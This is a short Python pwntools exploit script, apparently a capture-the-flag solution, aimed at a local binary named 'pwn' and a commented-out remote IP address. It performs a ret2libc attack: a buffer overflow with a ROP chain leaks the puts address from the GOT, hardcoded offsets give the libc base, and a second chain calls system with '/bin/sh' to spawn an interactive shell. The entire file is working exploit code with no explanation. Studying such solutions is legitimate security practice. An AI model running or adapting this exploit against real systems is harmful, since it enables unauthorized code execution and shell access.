from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./pwn')
# p = remote('111.231.70.44',28030)
elf = ELF('./pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x00000000004006e3
main = elf.symbols['main']
payload = b'a'*20 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil('\x0a')
puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
ret_addr = 0x00000000004006E4
libcbase = puts_addr -  0x0809c0
system_addr = libcbase + 0x04f440
bin_sh = libcbase + 0x1b3e9a
payload = flat([b'a'*20,ret_addr,pop_rdi,bin_sh,system_addr])
p.sendline(payload)
p.interactive()
